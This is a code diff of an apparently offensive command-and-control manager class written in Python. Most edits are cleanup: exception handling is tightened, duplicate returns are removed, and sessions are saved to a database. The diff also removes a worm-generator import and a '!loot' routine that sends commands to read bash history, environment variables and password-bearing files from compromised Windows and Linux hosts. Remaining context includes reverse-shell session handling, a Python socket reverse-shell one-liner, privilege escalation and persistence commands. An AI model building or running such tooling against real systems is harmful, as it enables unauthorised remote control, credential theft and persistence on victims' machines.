@@ -5,7 +5,6 @@ import os
 import base64
 import requests
 from modules.payloads.generator import PayloadGenerator
-from modules.payloads.worm_generator import WormGenerator
 from modules.payloads.obfuscator import Obfuscator
 
 class C2Manager:
@@ -54,7 +53,7 @@ class C2Manager:
                 # If target is localhost, ip will be 127.0.0.1 (Correct)
                 # If target is LAN/WAN, ip will be LAN/WAN IP (Correct)
                 return ip
-            except:
+            except Exception:
                 pass
 
             # 2. Fallback: Get Internet Facing IP
@@ -65,23 +64,13 @@ class C2Manager:
                 ip = s.getsockname()[0]
                 s.close()
                 return ip
-            except:
+            except Exception:
                 pass
 
             return "127.0.0.1"
-        except:
+        except Exception:
             return "127.0.0.1" 
 
-    def register_session(self, sock, addr, os_type="linux"):
-        self.mode = "socket"
-        self.active_socket = sock
-        self.client_address = addr
-        self.is_connected = True
-        self.os_type = os_type
-        self.output_buffer += f"\n[+] REVERSE SHELL CONNECTED FROM {addr} ({os_type.upper()})\n"
-        self._print_help()
-        self._notify_ui()
-        threading.Thread(target=self._listen_loop, daemon=True).start()
 
     def register_http_session(self, url, os_type="linux"):
         self.mode = "http"
@@ -278,12 +267,7 @@ class C2Manager:
             self._notify_ui()
             return
 
-            self._notify_ui()
-            return
-            
-            self._notify_ui()
-            return
-            
+
         # Payload Generation
         if action == "!generate" and len(parts) >= 4:
             ptype = parts[1].lower()
@@ -377,9 +361,6 @@ s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os
             self._notify_ui()
             return
 
-            self._notify_ui()
-            return
-
         # PrivEsc
         if action == "!privesc":
             self.output_buffer += "[*] Running Privilege Escalation Checks...\n"
@@ -413,36 +394,6 @@ s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os
             self._notify_ui()
             return
 
-        # Loot
-        if action == "!loot":
-            self.output_buffer += "[*] Looting Sensitive Files...\n"
-            self._notify_ui()
-            
-            cmds = []
-            if self.os_type == "windows":
-                cmds = [
-                    "dir C:\\Users", 
-                    "type C:\\Windows\\System32\\drivers\\etc\\hosts",
-                    "findstr /SI password *.txt *.xml *.config"
-                ]
-            else:
-                cmds = [
-                    "ls -la /home", 
-                    "cat /root/.bash_history", 
-                    "cat /etc/hosts", 
-                    "grep -r 'password' /var/www/html 2>/dev/null",
-                    "env"
-                ]
-            
-            for c in cmds:
-                if self.mode == "socket":
-                    self.active_socket.sendall(f"echo '\n=== {c} ==='; {c}\n".encode())
-                    time.sleep(1)
-                else:
-                    self._send_http_command(c)
-                    time.sleep(0.5)
-            self._notify_ui()
-            return
 
         # Persistence
         if action == "!persist" and len(parts) >= 3:
@@ -608,6 +559,19 @@ s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os
         self._load_session(self.active_session_index)
 
         self.output_buffer += f"[+] New Session Connected: {ip} (ID: {session_id})\n"
+        
+        # [NEW] Persist session to database
+        try:
+            from core.database import save_c2_session
+            save_c2_session({
+                'session_id': str(session_id),
+                'target_ip': ip,
+                'os_info': os_type,
+                'status': 'active'
+            })
+        except Exception:
+            pass
+        
         if self.ui_callback: self.ui_callback()
 
     def _load_session(self, index):
@@ -638,7 +602,7 @@ s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os
         if self.active_socket:
             try:
                 self.active_socket.close()
-            except: pass
+            except Exception: pass
         self.is_connected = False
         self.output_buffer += "\n[!] Session Closed.\n"
         
@@ -659,7 +623,7 @@ s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));os
                 text = data.decode(errors='ignore')
                 self.output_buffer += text
                 self._notify_ui()
-            except:
+            except Exception:
                 self.close_session()
                 break
 
